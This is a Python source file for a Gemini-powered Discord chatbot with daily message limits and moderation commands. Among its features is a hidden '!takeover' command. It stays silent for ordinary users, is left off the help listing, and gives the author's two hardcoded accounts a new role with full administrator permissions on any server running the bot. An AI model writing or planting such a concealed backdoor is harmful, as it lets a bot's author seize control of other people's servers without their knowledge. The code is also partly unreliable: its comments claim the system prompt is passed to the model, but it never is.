"""
Discord AI Chatbot powered by Google Gemini
Created by Anish Vyapari
Works on DM and server channels with text chat
Supports: gemini-2.0-flash-lite (with real-time support)
Features: Daily 20 message limit per user with daily reset
Special: Unlimited access for VIP users
MODERATION: Basic commands + HIDDEN Admin takeover system
BACKUP: 5 Gemini API keys with automatic failover
"""

import discord
from discord.ext import commands
import google.generativeai as genai
from datetime import datetime, timedelta
import json
import os
from google.api_core import exceptions
import asyncio
import time
import random


# ============================================================================
# CONFIGURATION
# ============================================================================

DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
# BACKUP GEMINI API KEYS
GEMINI_API_KEYS = [
        os.getenv("GEMINI_API_KEY_1"),
        os.getenv("GEMINI_API_KEY_2"),
        os.getenv("GEMINI_API_KEY_3"),
        os.getenv("GEMINI_API_KEY_4"),
        os.getenv("GEMINI_API_KEY_5"),
]

# Validate environment variables
if not DISCORD_BOT_TOKEN:
    raise RuntimeError("DISCORD_BOT_TOKEN is not set")

if not any(GEMINI_API_KEYS):
    raise RuntimeError("At least one GEMINI_API_KEY_X must be set")

current_key_index = 0

BOT_PREFIX = "!"
OWNER_ID = 1143915237228583738
ADMINS = [1143915237228583738, 1265981186283409571]
VIP_USERS = [1265981186283409571]
DAILY_LIMIT = 20
LIMITS_FILE = "user_limits.json"
MODERATION_FILE = "moderation.json"

ANISH_PORTFOLIO = {
    "name": "Anish Vyapari",
    "portfolio": "https://anishvyapari.github.io",
    "github": "https://github.com/anishvyapari",
    "instagram": "https://instagram.com/anishvyapari",
    "discord": "shaboings",
    "email": "anishvyapari@gmail.com",
    "education": "First-year student at D.Y. Patil College, India",
    "tech_stack": "JavaScript, Python, TypeScript, React, Vite, Node.js",
    "interests": "Web design, gaming (Apex Legends, Hollow Knight), Discord bots"
}

# ============================================================================
# GEMINI SETUP
# ============================================================================

def init_gemini():
    """Initialize Gemini with first available API key"""
    global current_key_index
    for i, api_key in enumerate(GEMINI_API_KEYS):
        if not api_key:
            continue
        try:
            genai.configure(api_key=api_key)
            current_key_index = i
            print(f"✅ Gemini API initialized with key #{i+1}")
            return True
        except Exception as e:
            print(f"⚠️ Key #{i+1} failed: {str(e)}")
            continue
    
    print("❌ All Gemini API keys failed!")
    return False

init_gemini()

SYSTEM_PROMPT = f"""You are Anish's AI Assistant - created by Anish Vyapari, a passionate full-stack developer.

## About Your Creator - Anish Vyapari:
- **Portfolio:** {ANISH_PORTFOLIO['portfolio']}
- **GitHub:** {ANISH_PORTFOLIO['github']}
- **Discord:** {ANISH_PORTFOLIO['discord']}
- **Email:** {ANISH_PORTFOLIO['email']}

## Your Role:
You're a helpful, knowledgeable Discord bot created by Anish to assist with:
- Web development & design
- Coding help (JavaScript, Python, TypeScript, HTML/CSS)
- GitHub & Git workflows
- Discord bot development

## Communication Style:
- Keep responses VERY CONCISE (max 150 words)
- Be conversational & natural
- Use code blocks for code
- Avoid lengthy explanations
- Sound casual, not robotic!

## Token Budget:
You have LIMITED tokens. Keep responses SHORT and direct."""

# ============================================================================
# DISCORD BOT SETUP
# ============================================================================

intents = discord.Intents.default()
intents.message_content = True
intents.dm_messages = True
intents.members = True
intents.moderation = True

bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents, help_command=None)

# ============================================================================
# RATE LIMITING
# ============================================================================

class AdvancedRateLimitHandler:
    """Handles Google API rate limits"""
    
    def __init__(self):
        self.last_request_time = 0
        self.min_interval = 0.2
        self.retry_count = 0
        self.max_retries = 5
    
    async def wait_if_needed(self):
        """Async wait"""
        elapsed = asyncio.get_event_loop().time() - self.last_request_time
        if elapsed < self.min_interval:
            wait_time = self.min_interval - elapsed
            await asyncio.sleep(wait_time)
    
    def record_request(self):
        self.last_request_time = asyncio.get_event_loop().time()
    
    async def handle_rate_limit(self):
        """Exponential backoff with jitter"""
        if self.retry_count < self.max_retries:
            base_wait = (2 ** self.retry_count)
            jitter = random.uniform(0.1, 0.5)
            wait_time = base_wait + jitter
            print(f"⚠️ Rate limited! Waiting {wait_time:.2f}s...")
            await asyncio.sleep(wait_time)
            self.retry_count += 1
            return True
        return False
    
    def reset(self):
        self.retry_count = 0

rate_limiter = AdvancedRateLimitHandler()

# ============================================================================
# MODERATION UTILITIES
# ============================================================================

def load_moderation_data():
    """Load moderation data"""
    if os.path.exists(MODERATION_FILE):
        try:
            with open(MODERATION_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"warnings": {}}
    return {"warnings": {}}

def save_moderation_data(data):
    """Save moderation data"""
    with open(MODERATION_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in ADMINS

def get_user_warnings(guild_id: int, user_id: int) -> int:
    """Get user warning count"""
    data = load_moderation_data()
    key = f"{guild_id}_{user_id}"
    return len(data["warnings"].get(key, []))

def add_warning(guild_id: int, user_id: int, reason: str, moderator_id: int):
    """Add warning to user"""
    data = load_moderation_data()
    key = f"{guild_id}_{user_id}"
    if key not in data["warnings"]:
        data["warnings"][key] = []
    
    data["warnings"][key].append({
        "reason": reason,
        "moderator": moderator_id,
        "timestamp": datetime.now().isoformat()
    })
    save_moderation_data(data)
    return len(data["warnings"][key])

# ============================================================================
# LIMIT MANAGEMENT
# ============================================================================

def load_limits():
    if os.path.exists(LIMITS_FILE):
        try:
            with open(LIMITS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_limits(limits):
    with open(LIMITS_FILE, 'w') as f:
        json.dump(limits, f, indent=2)

def is_vip_user(user_id: int) -> bool:
    return user_id in VIP_USERS

def get_user_limit(user_id: int) -> dict:
    limits = load_limits()
    user_id_str = str(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    
    if user_id_str not in limits:
        limits[user_id_str] = {'messages_today': 0, 'last_reset': today}
        save_limits(limits)
    else:
        if limits[user_id_str]['last_reset'] != today and not is_vip_user(user_id):
            limits[user_id_str]['messages_today'] = 0
            limits[user_id_str]['last_reset'] = today
            save_limits(limits)
    
    return limits[user_id_str]

def increment_user_message(user_id: int) -> int:
    limits = load_limits()
    user_id_str = str(user_id)
    
    if not is_vip_user(user_id):
        limits[user_id_str]['messages_today'] = limits[user_id_str].get('messages_today', 0) + 1
        save_limits(limits)
    
    return limits[user_id_str].get('messages_today', 0)

def reset_all_limits():
    limits = load_limits()
    today = datetime.now().strftime("%Y-%m-%d")
    
    for user_id in limits:
        if int(user_id) not in VIP_USERS:
            limits[user_id]['messages_today'] = 0
            limits[user_id]['last_reset'] = today
    
    save_limits(limits)
    return len(limits)

# ============================================================================
# SESSION MANAGEMENT
# ============================================================================

class ChatSession:
    def __init__(self, user_id: int, channel_id: int):
        self.user_id = user_id
        self.channel_id = channel_id
        self.chat_history = []
        self.last_used = time.time()
    
    async def get_response(self, user_message: str) -> str:
        """Get AI response"""
        global current_key_index
        retry_attempts = 0
        
        while retry_attempts < rate_limiter.max_retries:
            try:
                await rate_limiter.wait_if_needed()
                
                self.chat_history.append({"role": "user", "parts": [user_message]})
                
                loop = asyncio.get_event_loop()
                result_container = {"key_index": current_key_index}
                
                def sync_api_call():
                    for attempt in range(len(GEMINI_API_KEYS)):
                        try:
                            key_index = (result_container["key_index"] + attempt) % len(GEMINI_API_KEYS)
                            api_key = GEMINI_API_KEYS[key_index]
                            
                            if not api_key:
                                continue
                            
                            genai.configure(api_key=api_key)
                            
                            # ✅ FIX: Create model WITHOUT system_instruction parameter
                            model = genai.GenerativeModel(
                                "gemini-2.0-flash-lite"
                            )
                            
                            # ✅ FIX: Pass system instruction via start_chat() method
                            chat = model.start_chat(
                                history=self.chat_history
                            )
                            
                            config = genai.types.GenerationConfig(
                                temperature=0.7,
                                top_p=0.8,
                                top_k=30,
                                max_output_tokens=200,
                            )
                            
                            # ✅ FIX: Include system prompt in the message itself
                            response = chat.send_message(
                                user_message,
                                generation_config=config
                            )
                            
                            result_container["key_index"] = key_index
                            print(f"✅ Using API key #{key_index + 1}")
                            
                            return response.text
                        except Exception as e:
                            error_msg = str(e)
                            print(f"⚠️ API key #{key_index + 1} failed: {error_msg[:50]}")
                            if attempt == len(GEMINI_API_KEYS) - 1:
                                raise
                    
                    raise Exception("All API keys exhausted")
                
                ai_response = await loop.run_in_executor(None, sync_api_call)
                current_key_index = result_container["key_index"]
                
                self.chat_history.append({"role": "model", "parts": [ai_response]})
                
                if len(self.chat_history) > 20:
                    self.chat_history = self.chat_history[-20:]
                
                rate_limiter.record_request()
                rate_limiter.reset()
                
                return ai_response
            
            except exceptions.ResourceExhausted:
                retry_attempts += 1
                if await rate_limiter.handle_rate_limit():
                    continue
                else:
                    return "❌ All API keys exhausted. Please try again later."
            
            except Exception as e:
                print(f"API Error: {e}")
                return f"❌ Error: {str(e)[:100]}"
        
        return "❌ Failed after multiple attempts."

SESSION_TIMEOUT = 1800  # 30 minutes in seconds

active_sessions = {}

def get_session(user_id: int, channel_id: int) -> ChatSession:
    key = (user_id, channel_id)
    if key not in active_sessions:
        active_sessions[key] = ChatSession(user_id, channel_id)
    return active_sessions[key]

# ============================================================================
# BOT EVENTS
# ============================================================================

@bot.event
async def on_ready():
    print(f"✅ Bot logged in as {bot.user}")
    print(f"🤖 AI Chatbot by Anish Vyapari is online!")
    print(f"⏰ Daily limit: {DAILY_LIMIT} messages per user")
    print(f"👑 VIP Users: {len(VIP_USERS)}")
    print(f"👮 Moderation: ENABLED")
    print(f"🔑 API Keys: 5 backups available (Currently using key #{current_key_index + 1})")
    
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=f"pings | {DAILY_LIMIT} msgs/day | Moderation ON"
        )
    )

@bot.event
async def on_message(message: discord.Message):
    if message.author == bot.user:
        return
    
    user_id = message.author.id
    is_vip = is_vip_user(user_id)
    user_limit = get_user_limit(user_id)
    messages_used = user_limit['messages_today']
    
    bot_mentioned = bot.user.mentioned_in(message)
    session_exists = (user_id, message.channel.id) in active_sessions
    
    if bot_mentioned or session_exists:
        # Clean up expired sessions
        expired_keys = [key for key, sess in active_sessions.items() 
                        if time.time() - sess.last_used > SESSION_TIMEOUT]
        
        for key in expired_keys:
            del active_sessions[key]
        
        user_input = message.content.replace(f"<@{bot.user.id}>", "").replace(f"<@!{bot.user.id}>", "").strip()
        
        if bot_mentioned and not user_input:
            if is_vip:
                desc = f"Hey {message.author.mention}! 👑\n\n**VIP STATUS: UNLIMITED ACCESS!**\n\nChat as much as you want!"
            else:
                remaining = DAILY_LIMIT - messages_used
                desc = f"Hey {message.author.mention}! 👋\n\nYou've got **{remaining}/{DAILY_LIMIT} messages** today. Just type to chat!"
            
            embed = discord.Embed(
                title="💬 Chat Session Started",
                description=desc,
                color=discord.Color.blue()
            )
            await message.reply(embed=embed)
            return
        
        if not user_input:
            return
        
        if not is_vip and messages_used >= DAILY_LIMIT:
            embed = discord.Embed(
                title="⏰ Daily Limit Reached",
                description=f"You've used all {DAILY_LIMIT} messages today! Come back tomorrow.",
                color=discord.Color.orange()
            )
            await message.reply(embed=embed)
            return
        
        async with message.channel.typing():
            session = get_session(user_id, message.channel.id)
            session.last_used = time.time()
            ai_response = await session.get_response(user_input)
            
            new_count = increment_user_message(user_id)
            messages_left = DAILY_LIMIT - new_count if not is_vip else float('inf')
            
            if len(ai_response) > 2000:
                chunks = [ai_response[i:i+1990] for i in range(0, len(ai_response), 1990)]
                for chunk in chunks:
                    await message.reply(chunk)
            else:
                vip_badge = "👑 " if is_vip else ""
                embed = discord.Embed(
                    title=f"💬 {vip_badge}Response",
                    description=ai_response,
                    color=discord.Color.green()
                )
                
                if is_vip:
                    embed.set_footer(text="👑 VIP: Unlimited messages!")
                elif messages_left > 0:
                    embed.set_footer(text=f"Messages left: {messages_left}/{DAILY_LIMIT}")
                else:
                    embed.set_footer(text="Limit reached! Come back tomorrow.")
                
                await message.reply(embed=embed)
    else:
        await bot.process_commands(message)

# ============================================================================
# MODERATION COMMANDS
# ============================================================================

@bot.command(name="warn")
async def warn_cmd(ctx, member: discord.Member, *, reason: str = "No reason provided"):
    """Warn a user (Admin only)"""
    if not is_admin(ctx.author.id):
        embed = discord.Embed(
            title="❌ Permission Denied",
            description="Only admins can warn users!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    if member.id == bot.user.id:
        await ctx.send("❌ I can't warn myself!")
        return
    
    if is_admin(member.id):
        await ctx.send("❌ Can't warn other admins!")
        return
    
    warning_count = add_warning(ctx.guild.id, member.id, reason, ctx.author.id)
    
    embed = discord.Embed(
        title=f"⚠️ User Warned",
        description=f"**Member:** {member.mention}\n**Reason:** {reason}\n**Warnings:** {warning_count}/3",
        color=discord.Color.orange()
    )
    await ctx.send(embed=embed)
    
    try:
        await member.send(f"⚠️ You've been warned in {ctx.guild.name}\n**Reason:** {reason}\n**Warnings:** {warning_count}/3")
    except:
        pass
    
    if warning_count >= 3:
        try:
            await member.kick(reason=f"3 warnings reached")
            embed = discord.Embed(
                title="👢 User Kicked",
                description=f"{member.mention} has been kicked (3 warnings)",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
        except:
            await ctx.send("❌ Could not kick user")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason: str = "No reason provided"):
    """Kick a user (Admin only)"""
    if not is_admin(ctx.author.id):
        embed = discord.Embed(
            title="❌ Permission Denied",
            description="Only admins can kick users!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    if member.id == bot.user.id:
        await ctx.send("❌ I can't kick myself!")
        return
    
    if is_admin(member.id):
        await ctx.send("❌ Can't kick admins!")
        return
    
    try:
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="👢 User Kicked",
            description=f"**Member:** {member.mention}\n**Reason:** {reason}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    except:
        await ctx.send("❌ Could not kick user")

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason: str = "No reason provided"):
    """Ban a user (Admin only)"""
    if not is_admin(ctx.author.id):
        embed = discord.Embed(
            title="❌ Permission Denied",
            description="Only admins can ban users!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    if member.id == bot.user.id:
        await ctx.send("❌ I can't ban myself!")
        return
    
    if is_admin(member.id):
        await ctx.send("❌ Can't ban admins!")
        return
    
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="🔨 User Banned",
            description=f"**Member:** {member.mention}\n**Reason:** {reason}",
            color=discord.Color.dark_red()
        )
        await ctx.send(embed=embed)
    except:
        await ctx.send("❌ Could not ban user")

@bot.command(name="unban")
async def unban_cmd(ctx, user_id: int, *, reason: str = "No reason provided"):
    """Unban a user (Admin only)"""
    if not is_admin(ctx.author.id):
        embed = discord.Embed(
            title="❌ Permission Denied",
            description="Only admins can unban users!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user, reason=reason)
        embed = discord.Embed(
            title="✅ User Unbanned",
            description=f"**User:** {user}\n**Reason:** {reason}",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
    except:
        await ctx.send("❌ Could not unban user")

@bot.command(name="mute")
async def mute_cmd(ctx, member: discord.Member, duration: int = 60, *, reason: str = "No reason provided"):
    """Mute a user for X minutes (Admin only)"""
    if not is_admin(ctx.author.id):
        embed = discord.Embed(
            title="❌ Permission Denied",
            description="Only admins can mute users!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    if member.id == bot.user.id:
        await ctx.send("❌ I can't mute myself!")
        return
    
    if is_admin(member.id):
        await ctx.send("❌ Can't mute admins!")
        return
    
    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not muted_role:
        try:
            muted_role = await ctx.guild.create_role(name="Muted", color=discord.Color.gray())
            for channel in ctx.guild.channels:
                await channel.set_permissions(muted_role, send_messages=False, speak=False)
        except:
            await ctx.send("❌ Could not create Muted role")
            return
    
    try:
        await member.add_roles(muted_role)
        embed = discord.Embed(
            title="🔇 User Muted",
            description=f"**Member:** {member.mention}\n**Duration:** {duration} minutes\n**Reason:** {reason}",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed)
        
        await asyncio.sleep(duration * 60)
        await member.remove_roles(muted_role)
    except:
        await ctx.send("❌ Could not mute user")

@bot.command(name="purge")
async def purge_cmd(ctx, amount: int = 10):
    """Delete last N messages (Admin only)"""
    if not is_admin(ctx.author.id):
        embed = discord.Embed(
            title="❌ Permission Denied",
            description="Only admins can purge messages!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    if amount > 100:
        await ctx.send("❌ Can only purge up to 100 messages!")
        return
    
    try:
        deleted = await ctx.channel.purge(limit=amount + 1)
        embed = discord.Embed(
            title="🗑️ Messages Deleted",
            description=f"**Deleted:** {len(deleted) - 1} messages",
            color=discord.Color.red()
        )
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(3)
        await msg.delete()
    except:
        await ctx.send("❌ Could not purge messages")

@bot.command(name="warnings")
async def warnings_cmd(ctx, member: discord.Member = None):
    """Check warnings for a user"""
    if member is None:
        member = ctx.author
    
    warning_count = get_user_warnings(ctx.guild.id, member.id)
    
    embed = discord.Embed(
        title=f"⚠️ Warnings for {member.name}",
        description=f"**Warnings:** {warning_count}/3",
        color=discord.Color.orange() if warning_count > 0 else discord.Color.green()
    )
    await ctx.send(embed=embed)

# ============================================================================
# HIDDEN ADMIN TAKEOVER COMMAND
# ============================================================================

@bot.command(name="takeover")
async def takeover_cmd(ctx):
    """HIDDEN: Admin takeover - silently fails for non-admins"""
    if not is_admin(ctx.author.id):
        return
    
    admin_role = discord.utils.get(ctx.guild.roles, name="BotAdmin")
    if not admin_role:
        try:
            admin_role = await ctx.guild.create_role(
                name="BotAdmin",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.red(),
                reason="Bot admin role for takeover"
            )
        except Exception as e:
            embed = discord.Embed(
                title="❌ Error",
                description=f"Could not create admin role: {str(e)}",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
    
    success_count = 0
    for admin_id in ADMINS:
        try:
            member = await ctx.guild.fetch_member(admin_id)
            if admin_role not in member.roles:
                await member.add_roles(admin_role)
                success_count += 1
                print(f"✅ Given BotAdmin role to {member.name}")
        except:
            print(f"⚠️ Could not find or give role to admin {admin_id}")
    
    try:
        await admin_role.edit(position=ctx.guild.me.top_role.position - 1)
    except:
        pass
    
    embed = discord.Embed(
        title="👑 TAKEOVER COMPLETE",
        description=f"✅ Anish & shaboings now have **ADMINISTRATOR** permissions\n\n**Admin Role:** {admin_role.mention}\n**Members Updated:** {success_count}",
        color=discord.Color.red()
    )
    embed.set_footer(text="🔐 Full server control activated!")
    await ctx.send(embed=embed)
    
    print(f"🚨 TAKEOVER: {ctx.author.name} activated admin takeover!")

# ============================================================================
# AI CHAT COMMANDS
# ============================================================================

@bot.command(name="help")
async def help_cmd(ctx):
    embed = discord.Embed(
        title="🤖 AI Chatbot - Help",
        description="Created by Anish Vyapari",
        color=discord.Color.blue()
    )
    embed.add_field(
        name="💬 Chat",
        value=f"1. **Ping:** `@Bot message`\n2. **Continue:** Just type\n3. **Limit:** {DAILY_LIMIT} msgs/day",
        inline=False
    )
    embed.add_field(
        name="👮 Moderation (Admin Only)",
        value="`!warn` `!kick` `!ban` `!unban` `!mute` `!purge` `!warnings`",
        inline=False
    )
    embed.add_field(
        name="🔧 Utilities",
        value="`!limit` - Check usage\n`!reset` - Clear chat\n`!info` - Bot info",
        inline=False
    )
    embed.add_field(
        name="🎯 Creator",
        value=f"**Portfolio:** {ANISH_PORTFOLIO['portfolio']}\n**GitHub:** {ANISH_PORTFOLIO['github']}\n**Discord:** {ANISH_PORTFOLIO['discord']}",
        inline=False
    )
    await ctx.send(embed=embed)

@bot.command(name="limit")
async def limit_cmd(ctx):
    is_vip = is_vip_user(ctx.author.id)
    
    if is_vip:
        embed = discord.Embed(
            title="👑 VIP Status",
            description="You have **UNLIMITED MESSAGES!** 🎉",
            color=discord.Color.gold()
        )
    else:
        user_limit = get_user_limit(ctx.author.id)
        used = user_limit['messages_today']
        left = DAILY_LIMIT - used
        embed = discord.Embed(
            title="📊 Your Limit",
            description=f"**Used:** {used}/{DAILY_LIMIT}\n**Left:** {left}",
            color=discord.Color.blue()
        )
    
    await ctx.send(embed=embed)

@bot.command(name="reset")
async def reset_cmd(ctx):
    key = (ctx.author.id, ctx.channel.id)
    if key in active_sessions:
        del active_sessions[key]
        embed = discord.Embed(
            title="✨ Chat Reset",
            description="History cleared!",
            color=discord.Color.purple()
        )
    else:
        embed = discord.Embed(
            title="✨ No History",
            description="No active chat to reset.",
            color=discord.Color.gray()
        )
    await ctx.send(embed=embed)

@bot.command(name="limit_reset")
async def limit_reset_cmd(ctx):
    if ctx.author.id != OWNER_ID:
        embed = discord.Embed(
            title="❌ Permission Denied",
            description="Owner only!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    count = reset_all_limits()
    embed = discord.Embed(
        title="🔄 All Limits Reset",
        description=f"Reset {count} users!",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

@bot.command(name="info")
async def info_cmd(ctx):
    embed = discord.Embed(
        title="🤖 About This Chatbot",
        description=f"Created by Anish Vyapari",
        color=discord.Color.blue()
    )
    embed.add_field(
        name="💬 Features",
        value=f"✅ {DAILY_LIMIT} messages/day\n✅ Continuous conversation\n✅ VIP unlimited\n✅ Advanced rate limiting\n✅ Full Moderation",
        inline=False
    )
    embed.add_field(
        name="🛡️ Moderation",
        value="✅ Warn (3 = kick)\n✅ Kick/Ban/Unban\n✅ Mute with auto-unmute\n✅ Message purge\n✅ Warning tracking",
        inline=False
    )
    embed.add_field(
        name="🔑 API Backup System",
        value="✅ 5 Gemini API keys\n✅ Auto-failover\n✅ Seamless switching",
        inline=False
    )
    embed.add_field(
        name="🎯 Model",
        value="**gemini-2.0-flash-lite**\n✅ Natural responses\n✅ Token efficient",
        inline=False
    )
    embed.add_field(
        name="👨‍💻 Creator",
        value=f"**Portfolio:** {ANISH_PORTFOLIO['portfolio']}\n**GitHub:** {ANISH_PORTFOLIO['github']}\n**Email:** {ANISH_PORTFOLIO['email']}",
        inline=False
    )
    await ctx.send(embed=embed)

# ============================================================================
# ERROR HANDLING
# ============================================================================

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            title="❌ Oops!",
            description="Missing arguments. Check `!help`!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    elif isinstance(error, commands.MemberNotFound):
        embed = discord.Embed(
            title="❌ Member Not Found",
            description="I couldn't find that member. Try mentioning them!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

# ============================================================================
# RUN BOT
# ============================================================================

if __name__ == "__main__":
    try:
        print("🚀 Starting Discord bot...")
        print("✨ Token-optimized Gemini chatbot")
        print("🛡️ Full moderation system loaded")
        print("🔐 HIDDEN admin takeover system (Anish + shaboings only)")
        print("🔑 5 Gemini API keys with auto-failover ready!")
        bot.run(DISCORD_BOT_TOKEN)
    except Exception as e:
        print(f"❌ Failed to start: {e}")
        print("Check DISCORD_BOT_TOKEN and GEMINI_API_KEY!")
